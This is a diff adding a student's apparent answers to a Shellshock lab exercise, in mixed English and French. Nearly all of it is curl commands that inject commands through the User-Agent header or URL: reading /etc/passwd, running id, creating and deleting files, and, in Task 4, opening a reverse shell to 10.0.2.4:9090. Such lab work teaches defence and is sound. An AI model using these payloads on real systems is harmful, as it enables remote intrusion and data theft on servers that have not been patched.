@@ -1,0 +1,32 @@
+Task 3.A: Get the server to send back the content of the/etc/passwdfile.
+	
+	curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
+Task 3.B: Get the server to tell you its process’ user ID. You can use the/bin/idcommand to printout the ID information.
+
+	curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
+Task 3.C: Get the server to create a file inside the/tmpfolder. You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the/tmpfolder.
+
+	curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/touch /tmp/vrs" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+	
+On crée un document vrs dans tmp avec cette commande.
+
+Task 3.D: Get the server to delete the file that you just created inside the/tmpfolder.
+
+	curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/rm /tmp/vrs" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
+
+Question 1: Will you be able to steal the content of the shadow file/etc/shadowfrom the server?Why or why not? The information obtained in Task 3.B should give you a clue.
+
+	In task 3B we see that uid=gid=33 which means that we are not the root user (root user uid=0) and only the root user gets to see the content of the shadow file.
+
+
+Question 2 : attaque via arguments dans l'URL 
+
+	curl -v "http://www.seedlab-shellshock.com/cgi-bin/vul.cgi?()"{ :; }"; echo Content_type : text/plain; echo; /bin/ls -l"
+	
+Task 4: Getting a Reverse Shell via Shellshock Attack
+
+	curl -A "() { :; }; /bin/bash -i -> /dev/tcp/10.0.2.4/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
